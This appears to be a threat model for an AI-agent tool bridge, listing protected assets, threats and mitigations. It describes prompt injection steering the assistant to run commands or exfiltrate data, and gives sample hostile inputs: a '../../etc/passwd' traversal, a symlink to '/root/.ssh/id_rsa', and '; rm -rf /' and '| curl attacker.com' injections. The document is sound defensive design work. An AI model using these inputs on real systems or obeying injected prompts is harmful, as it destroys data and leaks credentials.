# AI Bridge Threat Model

## 1. Assets to Protect
- Host operating system integrity and host credentials (SSH keys, cloud credentials, `/etc/shadow`, SAM database).
- Data files outside the configured workspace directory.
- Running production services and containers.
- Control plane authentication tokens and communication channels.

## 2. Threat Actors & Scenarios
- **Compromised AI Model / Prompt Injection**: An untrusted prompt injected via external file or web content tries to manipulate the AI assistant into running malicious commands or exfiltrating data.
  - *Mitigation*: The AI assistant has no ability to run raw commands. All tools have strict Pydantic schemas. Tool outputs are sanitized. Server-side policy engine rejects unauthorized paths and tier elevations.
- **Path Traversal & Symlink Escape**: An attacker provides paths such as `../../etc/passwd` or creates a symlink pointing to `/root/.ssh/id_rsa`.
  - *Mitigation*: `PolicyEngine.confine_path` strictly validates relative paths, rejects `..`, resolves canonical symlinks via `Path.resolve()`, and verifies `workspace_root in resolved.parents`.
- **Command Injection**: An attacker submits arguments with shell metacharacters (`; rm -rf /`, `| curl attacker.com`).
  - *Mitigation*: All subprocess calls use explicit argument lists (`argv: list[str]`) with `shell=False`. No shell expansion occurs.
- **Accidental Destruction**: The AI assistant overwrites a critical configuration file during refactoring.
  - *Mitigation*: Task orchestrator automatically generates a timestamped snapshot in `.backups/` prior to executing any file edit or deletion.
- **Rogue AI Loops / Resource Exhaustion**: The AI assistant submits hundreds of concurrent tasks or spawns runaway processes.
  - *Mitigation*: Process execution timeouts (5s to 60s max), maximum read output caps (128KB - 512KB), and a Global Emergency Stop kill switch.

## 3. Residual Risks & Operational Assumptions
- Workspace contents are considered user-accessible. Sensitive corporate secrets should NOT be kept directly inside the agent's workspace folder.
- Human operators must review Tier 4 approvals carefully and not blindly approve destructive requests.
